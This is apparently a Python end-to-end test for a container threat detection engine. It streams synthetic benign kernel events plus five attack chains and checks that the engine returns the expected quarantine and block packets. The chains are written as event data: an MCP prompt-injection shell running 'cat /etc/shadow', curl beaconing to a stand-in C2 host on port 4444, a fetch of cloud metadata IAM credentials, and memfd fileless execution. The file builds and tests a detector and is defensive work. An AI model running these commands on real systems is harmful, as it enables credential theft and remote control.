#!/usr/bin/env python3
"""End-to-end MCP prompt-injection / container-breakout simulation.

This script plays the role of the C++ collector: it stands up a real
``AF_UNIX``/``SOCK_SEQPACKET`` socket, launches the Python threat engine as a
separate process, streams 10,000 synthetic benign kernel events plus five
realistic attack chains, and verifies that the engine returns exactly the
expected binary ``wire_policy_cmd_t`` quarantine packets - the same bytes the C++
collector turns into eBPF map updates.

Attack chains (each in its own container / cgroup)
--------------------------------------------------
A. MCP prompt injection -> interactive shell
      node -> python3 -> /bin/sh
      expect: MCP_SHELL_BREAKOUT           -> QUARANTINE_CGROUP(cgroup_A)
B. MCP tool used for recon + reverse shell
      node -> python3 -> curl, then curl -> 203.0.113.9:4444
      expect: MCP_RECON_OR_EXFIL_TOOL      -> QUARANTINE_PID(curl)
              SUSPICIOUS_OUTBOUND_C2_PORT  -> BLOCK_IPV4(203.0.113.9)
C. Cloud metadata credential theft
      python3 -> curl, then curl -> 169.254.169.254:80
      expect: MCP_RECON_OR_EXFIL_TOOL      -> QUARANTINE_PID(curl)
              CLOUD_IMDS_CREDENTIAL_THEFT  -> QUARANTINE_CGROUP(cgroup_C)
                                            + BLOCK_IPV4(169.254.169.254)
D. Host credential harvest
      python3 -> cat /etc/shadow
      expect: SENSITIVE_CREDENTIAL_HARVEST  -> QUARANTINE_PID(cat)
E. Fileless payload staging
      python3 -> memfd_create("payload"), then exec from /proc/self/fd/3
      expect: FILELESS_MEMFD_EXECUTION      -> QUARANTINE_CGROUP(cgroup_E)

Usage::

    python3 tests/simulate_mcp_attack.py [--events 10000] [--keep]

Exit code 0 means: every expected enforcement packet arrived, the engine kept up
with the full event stream, and the SHA-256 audit chain verifies.
"""

from __future__ import annotations

import argparse
import json
import os
import random
import shutil
import socket
import statistics
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
from collections import Counter
from dataclasses import dataclass, field
from pathlib import Path
from typing import Iterable

REPO_ROOT = Path(__file__).resolve().parents[1]
SRC_ROOT = REPO_ROOT / "src"
if str(SRC_ROOT) not in sys.path:
    sys.path.insert(0, str(SRC_ROOT))

from engine import abi  # noqa: E402
from engine.lineage import LineageGraph  # noqa: E402
from engine.mitigator import AlertLog  # noqa: E402
from engine.rule_engine import RuleEngine  # noqa: E402

RULES_PATH = REPO_ROOT / "config" / "rules.yaml"
ALERT_SCHEMA_ACTIONS = {
    abi.CmdType.QUARANTINE_PID,
    abi.CmdType.QUARANTINE_CGROUP,
    abi.CmdType.BLOCK_IPV4,
}


# --------------------------------------------------------------------------- #
# Synthetic traffic
# --------------------------------------------------------------------------- #

BENIGN_EXECUTABLES: tuple[tuple[str, str], ...] = (
    ("python3", "/usr/bin/python3"),
    ("node", "/usr/bin/node"),
    ("uvicorn", "/usr/local/bin/uvicorn"),
    ("ls", "/usr/bin/ls"),
    ("cat", "/usr/bin/cat"),
    ("git", "/usr/bin/git"),
    ("pip3", "/usr/bin/pip3"),
    ("nginx", "/usr/sbin/nginx"),
)

BENIGN_PEERS: tuple[tuple[str, int], ...] = (
    ("10.0.0.12", 443),
    ("10.0.4.31", 5432),
    ("140.82.121.4", 443),
    ("151.101.1.63", 80),
)

BENIGN_PATHS: tuple[str, ...] = (
    "/app/data.json",
    "/etc/hosts",
    "/tmp/cache.bin",
    "/var/lib/app/state.db",
)


def _event(**kwargs) -> abi.Event:
    return abi.Event(timestamp_ns=time.time_ns(), **kwargs)


def benign_events(count: int, *, start_pid: int = 10_000,
                  container_id: str, cgroup_id: int,
                  seed: int = 2024) -> list[abi.Event]:
    """Generate a realistic, entirely benign kernel event stream."""
    rng = random.Random(seed)
    events: list[abi.Event] = []
    pid = start_pid
    while len(events) < count:
        pid += 1
        comm, exe = rng.choice(BENIGN_EXECUTABLES)
        base = dict(pid=pid, tgid=pid, ppid=max(1, pid - 1), uid=1000, gid=1000,
                    comm=comm, container_id=container_id, cgroup_id=cgroup_id)
        events.append(_event(event_type=abi.EventType.EXECVE, filename=exe, **base))
        if rng.random() < 0.55:
            peer, port = rng.choice(BENIGN_PEERS)
            events.append(_event(event_type=abi.EventType.CONNECT, af_family=2,
                                 daddr_v4=peer, dport=port, **base))
        if rng.random() < 0.35:
            events.append(_event(event_type=abi.EventType.OPENAT,
                                 filename=rng.choice(BENIGN_PATHS), **base))
        if rng.random() < 0.10:
            events.append(_event(event_type=abi.EventType.PROCESS_EXIT, **base))
    return events[:count]


@dataclass
class AttackChain:
    """One attack scenario with its expected kernel enforcement packets."""

    key: str
    title: str
    events: list[abi.Event]
    expected: list[tuple[int, int, int]] = field(default_factory=list)
    #: (cmd_type, target_pid, target_cgroup_id) - target_pid is used for
    #: QUARANTINE_PID, target_cgroup_id for QUARANTINE_CGROUP, and the IPv4
    #: block is checked by address string.
    expected_ips: list[str] = field(default_factory=list)


def build_attack_chains() -> list[AttackChain]:
    """Build the five attack scenarios used by the verification."""
    chains: list[AttackChain] = []

    container_a = f"{0xA0A:060x}"
    cgroup_a = 0xA001
    chains.append(
        AttackChain(
            key="A",
            title="MCP prompt injection -> interactive shell",
            events=[
                _event(event_type=abi.EventType.EXECVE, pid=10101, tgid=10101, ppid=1,
                       uid=1000, gid=1000, comm="mcp-server",
                       filename="/usr/local/bin/mcp-server", cgroup_id=cgroup_a,
                       container_id=container_a),
                _event(event_type=abi.EventType.EXECVE, pid=10102, tgid=10102, ppid=10101,
                       uid=1000, gid=1000, comm="python3", filename="/usr/bin/python3",
                       args="-m mcp_server.tools", cgroup_id=cgroup_a,
                       container_id=container_a),
                _event(event_type=abi.EventType.EXECVE, pid=10103, tgid=10103, ppid=10102,
                       uid=1000, gid=1000, comm="sh", filename="/bin/sh",
                       args="-c 'id; cat /etc/shadow'", cgroup_id=cgroup_a,
                       container_id=container_a),
            ],
            expected=[(abi.CmdType.QUARANTINE_CGROUP, 0, cgroup_a)],
        )
    )

    container_b = f"{0xB0B:060x}"
    cgroup_b = 0xA002
    chains.append(
        AttackChain(
            key="B",
            title="MCP recon tool + reverse shell port",
            events=[
                _event(event_type=abi.EventType.EXECVE, pid=10201, tgid=10201, ppid=1,
                       uid=1000, gid=1000, comm="node", filename="/usr/bin/node",
                       args="mcp-tools.js", cgroup_id=cgroup_b, container_id=container_b),
                _event(event_type=abi.EventType.EXECVE, pid=10202, tgid=10202, ppid=10201,
                       uid=1000, gid=1000, comm="python3", filename="/usr/bin/python3",
                       cgroup_id=cgroup_b, container_id=container_b),
                _event(event_type=abi.EventType.EXECVE, pid=10203, tgid=10203, ppid=10202,
                       uid=1000, gid=1000, comm="curl", filename="/usr/bin/curl",
                       args="-s http://203.0.113.9:4444/beacon", cgroup_id=cgroup_b,
                       container_id=container_b),
                _event(event_type=abi.EventType.CONNECT, pid=10203, tgid=10203, ppid=10202,
                       uid=1000, gid=1000, comm="curl", af_family=2,
                       daddr_v4="203.0.113.9", dport=4444, cgroup_id=cgroup_b,
                       container_id=container_b),
            ],
            expected=[
                (abi.CmdType.QUARANTINE_PID, 10203, 0),
            ],
            expected_ips=["203.0.113.9"],
        )
    )

    container_c = f"{0xC0C:060x}"
    cgroup_c = 0xA003
    chains.append(
        AttackChain(
            key="C",
            title="Cloud IMDS credential theft",
            events=[
                _event(event_type=abi.EventType.EXECVE, pid=10301, tgid=10301, ppid=1,
                       uid=1000, gid=1000, comm="python3", filename="/usr/bin/python3",
                       args="-m agent", cgroup_id=cgroup_c, container_id=container_c),
                _event(event_type=abi.EventType.EXECVE, pid=10302, tgid=10302, ppid=10301,
                       uid=1000, gid=1000, comm="curl", filename="/usr/bin/curl",
                       args="http://169.254.169.254/latest/meta-data/iam/", 
                       cgroup_id=cgroup_c, container_id=container_c),
                _event(event_type=abi.EventType.CONNECT, pid=10302, tgid=10302, ppid=10301,
                       uid=1000, gid=1000, comm="curl", af_family=2,
                       daddr_v4="169.254.169.254", dport=80, cgroup_id=cgroup_c,
                       container_id=container_c),
            ],
            expected=[
                (abi.CmdType.QUARANTINE_PID, 10302, 0),
                (abi.CmdType.QUARANTINE_CGROUP, 0, cgroup_c),
            ],
            expected_ips=["169.254.169.254"],
        )
    )

    container_d = f"{0xD0D:060x}"
    cgroup_d = 0xA004
    chains.append(
        AttackChain(
            key="D",
            title="Host credential harvest",
            events=[
                _event(event_type=abi.EventType.EXECVE, pid=10401, tgid=10401, ppid=1,
                       uid=1000, gid=1000, comm="python3", filename="/usr/bin/python3",
                       cgroup_id=cgroup_d, container_id=container_d),
                _event(event_type=abi.EventType.EXECVE, pid=10402, tgid=10402, ppid=10401,
                       uid=0, gid=0, comm="cat", filename="/usr/bin/cat",
                       args="/etc/shadow", cgroup_id=cgroup_d, container_id=container_d),
                _event(event_type=abi.EventType.OPENAT, pid=10402, tgid=10402, ppid=10401,
                       uid=0, gid=0, comm="cat", filename="/etc/shadow", open_flags=0,
                       cgroup_id=cgroup_d, container_id=container_d),
            ],
            expected=[(abi.CmdType.QUARANTINE_PID, 10402, 0)],
        )
    )

    container_e = f"{0xE0E:060x}"
    cgroup_e = 0xA005
    chains.append(
        AttackChain(
            key="E",
            title="Fileless payload staging via memfd",
            events=[
                _event(event_type=abi.EventType.EXECVE, pid=10501, tgid=10501, ppid=1,
                       uid=1000, gid=1000, comm="python3", filename="/usr/bin/python3",
                       cgroup_id=cgroup_e, container_id=container_e),
                _event(event_type=abi.EventType.MEMFD_CREATE, pid=10502, tgid=10502,
                       ppid=10501, uid=1000, gid=1000, comm="python3",
                       filename="payload", open_flags=0, cgroup_id=cgroup_e,
                       container_id=container_e),
                _event(event_type=abi.EventType.EXECVE, pid=10503, tgid=10503, ppid=10502,
                       uid=1000, gid=1000, comm="payload", filename="/proc/self/fd/3",
                       cgroup_id=cgroup_e, container_id=container_e),
            ],
            expected=[(abi.CmdType.QUARANTINE_CGROUP, 0, cgroup_e)],
        )
    )

    return chains


# --------------------------------------------------------------------------- #
# Mock collector (plays the role of the C++ daemon)
# --------------------------------------------------------------------------- #

class MockCollector:
    def __init__(self, path: str) -> None:
        self.path = path
        self.commands: list[abi.PolicyCommand] = []
        self.raw_commands: list[bytes] = []
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._conn: socket.socket | None = None
        self._reader: threading.Thread | None = None
        self._server = socket.socket(socket.AF_UNIX, socket.SOCK_SEQPACKET)
        self._server.settimeout(30.0)
        if os.path.exists(path):
            os.unlink(path)
        self._server.bind(path)
        self._server.listen(4)

    # -- lifecycle --------------------------------------------------------- #
    def accept(self, timeout: float = 30.0) -> None:
        self._server.settimeout(timeout)
        conn, _ = self._server.accept()
        conn.settimeout(0.5)
        self._conn = conn
        self._reader = threading.Thread(target=self._read_loop, daemon=True)
        self._reader.start()

    def close(self) -> None:
        self._stop.set()
        if self._reader is not None:
            self._reader.join(timeout=2.0)
        if self._conn is not None:
            try:
                self._conn.close()
            except OSError:
                pass
            self._conn = None
        try:
            self._server.close()
        finally:
            if os.path.exists(self.path):
                try:
                    os.unlink(self.path)
                except OSError:
                    pass

    # -- I/O --------------------------------------------------------------- #
    def send(self, data: bytes) -> None:
        assert self._conn is not None
        self._conn.sendall(data)

    def _read_loop(self) -> None:
        assert self._conn is not None
        while not self._stop.is_set():
            try:
                data = self._conn.recv(64)
            except socket.timeout:
                continue
            except OSError:
                return
            if not data:
                return
            if len(data) != abi.POLICY_CMD_SIZE:
                continue
            with self._lock:
                self.raw_commands.append(data)
                try:
                    self.commands.append(abi.PolicyCommand.from_bytes(data))
                except ValueError:
                    continue

    def snapshot(self) -> list[abi.PolicyCommand]:
        with self._lock:
            return list(self.commands)

    def wait_for(self, predicate, timeout: float) -> bool:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if predicate(self.snapshot()):
                return True
            time.sleep(0.002)
        return predicate(self.snapshot())


# --------------------------------------------------------------------------- #
# Engine process management
# --------------------------------------------------------------------------- #

def free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


def start_engine(socket_path: str, alert_log: str, metrics_port: int,
                 stdout_path: str) -> subprocess.Popen:
    env = dict(os.environ)
    env["PYTHONPATH"] = str(SRC_ROOT) + os.pathsep + env.get("PYTHONPATH", "")
    command = [
        sys.executable, "-m", "engine.main",
        "--socket-path", socket_path,
        "--rules", str(RULES_PATH),
        "--alert-log", alert_log,
        "--metrics-host", "127.0.0.1",
        "--metrics-port", str(metrics_port),
        "--enforce-kernel",
        "--no-color",
        "--quiet",
    ]
    handle = open(stdout_path, "wb")
    return subprocess.Popen(command, env=env, stdout=handle, stderr=subprocess.STDOUT,
                            cwd=str(REPO_ROOT))


def scrape_metric(port: int, series: str) -> float | None:
    """Return the summed value of ``series`` from the Prometheus endpoint."""
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}/metrics", timeout=2.0) as fp:
            body = fp.read().decode("utf-8", "replace")
    except (urllib.error.URLError, OSError, TimeoutError):
        return None
    total = 0.0
    found = False
    for line in body.splitlines():
        if line.startswith("#") or not line.startswith(series):
            continue
        parts = line.rsplit(" ", 1)
        if len(parts) != 2:
            continue
        try:
            total += float(parts[1])
        except ValueError:
            continue
        found = True
    return total if found else None


# --------------------------------------------------------------------------- #
# Benchmark helpers
# --------------------------------------------------------------------------- #

def percentile(values: list[float], fraction: float) -> float:
    if not values:
        return 0.0
    ordered = sorted(values)
    index = min(len(ordered) - 1, int(round(fraction * (len(ordered) - 1))))
    return ordered[index]


def benchmark_rule_engine(events: Iterable[abi.Event], rounds: int = 1) -> dict[str, float]:
    """Replay the same stream through the rule engine and time each event."""
    engine = RuleEngine.from_file(RULES_PATH, cooldown_seconds=0.0)
    graph = LineageGraph()
    samples: list[float] = []
    alerts = 0
    started = time.perf_counter()
    for _ in range(rounds):
        for event in events:
            graph.observe(event)
            t0 = time.perf_counter()
            matches = engine.evaluate(event, graph)
            samples.append((time.perf_counter() - t0) * 1e6)
            alerts += len(matches)
    elapsed = time.perf_counter() - started
    return {
        "events": float(len(samples)),
        "alerts": float(alerts),
        "elapsed_s": elapsed,
        "events_per_s": len(samples) / elapsed if elapsed else 0.0,
        "mean_us": statistics.fmean(samples) if samples else 0.0,
        "p50_us": percentile(samples, 0.50),
        "p95_us": percentile(samples, 0.95),
        "p99_us": percentile(samples, 0.99),
        "max_us": max(samples) if samples else 0.0,
    }


# --------------------------------------------------------------------------- #
# Main scenario
# --------------------------------------------------------------------------- #

def run_scenario(event_count: int, keep: bool) -> int:
    workdir = tempfile.mkdtemp(prefix="xsypher-sim-")
    socket_path = os.path.join(workdir, "stream.sock")
    alert_log = os.path.join(workdir, "alerts.jsonl")
    engine_log = os.path.join(workdir, "engine.log")
    metrics_port = free_port()

    failures: list[str] = []
    collector = MockCollector(socket_path)
    engine: subprocess.Popen | None = None

    print("=" * 78)
    print(" xSypher-Stream :: end-to-end MCP attack simulation")
    print("=" * 78)
    print(f"  workdir     : {workdir}")
    print(f"  socket      : {socket_path}")
    print(f"  alert log   : {alert_log}")
    print(f"  metrics     : http://127.0.0.1:{metrics_port}/metrics")
    print(f"  rules       : {RULES_PATH}")

    try:
        chains = build_attack_chains()
        benign = benign_events(
            max(100, event_count), container_id=f"{0x1234:064x}", cgroup_id=0x9001
        )
        print(f"  benign evts : {len(benign)}")
        print(f"  chains      : {len(chains)} attack scenarios")

        engine = start_engine(socket_path, alert_log, metrics_port, engine_log)
        collector.accept(timeout=30.0)
        print("  engine      : connected")

        # The engine announces enforcement mode as soon as it connects.
        collector.wait_for(
            lambda commands: any(c.cmd_type == abi.CmdType.SET_ENFORCEMENT_MODE
                                 for c in commands),
            timeout=5.0,
        )

        # ---- baseline stream ------------------------------------------- #
        started = time.perf_counter()
        for event in benign:
            collector.send(abi.encode_wire_frame(event, seq_no=event.pid))
        baseline_elapsed = time.perf_counter() - started
        print(f"\n  [1/3] streamed {len(benign)} benign events in "
              f"{baseline_elapsed:.2f}s "
              f"({len(benign) / max(baseline_elapsed, 1e-9):,.0f} events/s)")

        # ---- attack chains --------------------------------------------- #
        print("\n  [2/3] injecting attack chains")
        timings: dict[str, float] = {}
        for chain in chains:
            before = len(collector.snapshot())
            chain_started = time.perf_counter()
            for event in chain.events:
                collector.send(abi.encode_wire_frame(event, seq_no=event.pid))

            wanted = len(chain.expected) + len(chain.expected_ips)
            got = collector.wait_for(
                lambda commands, before=before, wanted=wanted: len(commands) >= before + wanted,
                timeout=5.0,
            )
            timings[chain.key] = (time.perf_counter() - chain_started) * 1000.0
            marker = "ok " if got else "MISS"
            print(f"        {marker} chain {chain.key}: {chain.title} "
                  f"({timings[chain.key]:.1f} ms)")
            if not got:
                failures.append(
                    f"chain {chain.key} produced {len(collector.snapshot()) - before} "
                    f"command(s), expected {wanted}"
                )

        # ---- verification ---------------------------------------------- #
        print("\n  [3/3] verifying enforcement packets")

        expected_counter: Counter[tuple[int, int, int]] = Counter()
        expected_addresses: list[str] = []
        for chain in chains:
            for cmd_type, pid, cgroup_id in chain.expected:
                expected_counter[(cmd_type, pid, cgroup_id)] += 1
            expected_addresses.extend(chain.expected_ips)

        received = collector.snapshot()
        enforcement = [c for c in received if c.cmd_type in ALERT_SCHEMA_ACTIONS]
        actual_counter: Counter[tuple[int, int, int]] = Counter()
        for command in enforcement:
            if command.cmd_type == abi.CmdType.QUARANTINE_PID:
                actual_counter[(command.cmd_type, command.target_pid, 0)] += 1
            elif command.cmd_type == abi.CmdType.QUARANTINE_CGROUP:
                actual_counter[(command.cmd_type, 0, command.target_cgroup_id)] += 1
            else:
                actual_counter[(command.cmd_type, 0, 0)] += 1

        for key, count in expected_counter.items():
            if actual_counter.get(key, 0) != count:
                failures.append(
                    f"expected {count}x {abi.CmdType.name(key[0])} "
                    f"pid={key[1]} cgroup={key[2]}, got {actual_counter.get(key, 0)}"
                )

        received_ips = sorted(
            abi.ipv4_from_raw(c.target_ipv4) for c in enforcement
            if c.cmd_type == abi.CmdType.BLOCK_IPV4
        )
        if received_ips != sorted(expected_addresses):
            failures.append(
                f"expected blocked IPv4 {sorted(expected_addresses)}, got {received_ips}"
            )

        expected_total = sum(expected_counter.values()) + len(expected_addresses)
        if len(enforcement) != expected_total:
            failures.append(
                f"expected exactly {expected_total} enforcement packets, "
                f"got {len(enforcement)}"
            )

        # ---- engine processed everything? ------------------------------- #
        processed = None
        deadline = time.monotonic() + 20.0
        while time.monotonic() < deadline:
            processed = scrape_metric(metrics_port, "xsypher_events_total")
            if processed is not None and processed >= len(benign):
                break
            time.sleep(0.1)
        if processed is None:
            failures.append("prometheus endpoint never became readable")
        elif processed < len(benign):
            failures.append(
                f"engine processed {processed:.0f} of {len(benign)} benign events"
            )

        events_sent = len(benign) + sum(len(chain.events) for chain in chains)
        elapsed_total = time.perf_counter() - started
        throughput = events_sent / max(elapsed_total, 1e-9)

        # ---- audit trail -------------------------------------------------- #
        ok, records, chain_error = AlertLog.verify(alert_log)
        if not ok:
            failures.append(f"audit hash chain invalid: {chain_error}")
        elif records < len(chains):
            failures.append(f"only {records} alert record(s) for {len(chains)} chains")

        alerts_by_rule: Counter[str] = Counter()
        if os.path.exists(alert_log):
            with open(alert_log, encoding="utf-8") as handle:
                for line in handle:
                    if line.strip():
                        alerts_by_rule[json.loads(line)["rule"]] += 1

        # ---- benchmark ---------------------------------------------------- #
        print("\n  rule engine benchmark (in-process replay of the same stream)")
        stream = list(benign) + [event for chain in chains for event in chain.events]
        bench = benchmark_rule_engine(stream)
        print(f"        events           : {int(bench['events']):,}")
        print(f"        alerts           : {int(bench['alerts'])}")
        print(f"        throughput       : {bench['events_per_s']:,.0f} events/s")
        print(f"        rule eval mean   : {bench['mean_us']:.2f} us")
        print(f"        rule eval p50    : {bench['p50_us']:.2f} us")
        print(f"        rule eval p95    : {bench['p95_us']:.2f} us")
        print(f"        rule eval p99    : {bench['p99_us']:.2f} us")
        print(f"        rule eval max    : {bench['max_us']:.2f} us")

        print("\n  results")
        print(f"        events streamed  : {events_sent:,} "
              f"({throughput:,.0f} events/s end-to-end)")
        print(f"        engine processed : {processed if processed is not None else 'n/a'}")
        print(f"        enforcement pkts : {len(enforcement)} "
              f"(expected {expected_total})")
        for command in enforcement:
            print(f"          - {command.describe()}")
        print(f"        alerts by rule   : "
              f"{', '.join(f'{k}={v}' for k, v in sorted(alerts_by_rule.items()))}")
        print(f"        audit chain      : "
              f"{'verified' if ok else 'BROKEN'} ({records} record(s))")
        print(f"        mitigation latency: "
              + ", ".join(f"{k}={v:.1f}ms" for k, v in timings.items()))

        if bench["p99_us"] > 500.0:
            failures.append(
                f"rule evaluation p99 {bench['p99_us']:.1f} us exceeds the 500 us budget"
            )

    except Exception as exc:  # pragma: no cover - environment failure path
        failures.append(f"unexpected error: {exc!r}")
    finally:
        # Stop the engine cleanly so it can release its policy entries.
        if engine is not None:
            if engine.poll() is None:
                engine.terminate()
                try:
                    engine.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    engine.kill()
                    engine.wait(timeout=5)
        collector.close()

    print()
    if failures:
        print("RESULT: FAILED")
        for failure in failures:
            print(f"  - {failure}")
        if os.path.exists(engine_log):
            print("\n--- engine log (tail) ---")
            with open(engine_log, "r", encoding="utf-8", errors="replace") as handle:
                print("".join(handle.readlines()[-40:]))
        if keep:
            print(f"artifacts kept in {workdir}")
        else:
            shutil.rmtree(workdir, ignore_errors=True)
        return 1

    print("RESULT: PASSED - all attack chains were detected and contained, "
          "every expected wire_policy_cmd_t was delivered.")
    if keep:
        print(f"artifacts kept in {workdir}")
    else:
        shutil.rmtree(workdir, ignore_errors=True)
    return 0


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--events", type=int, default=10_000,
                        help="number of baseline benign events (default: 10000)")
    parser.add_argument("--keep", action="store_true",
                        help="keep the temporary work directory")
    args = parser.parse_args(argv)
    return run_scenario(args.events, args.keep)


if __name__ == "__main__":
    sys.exit(main())
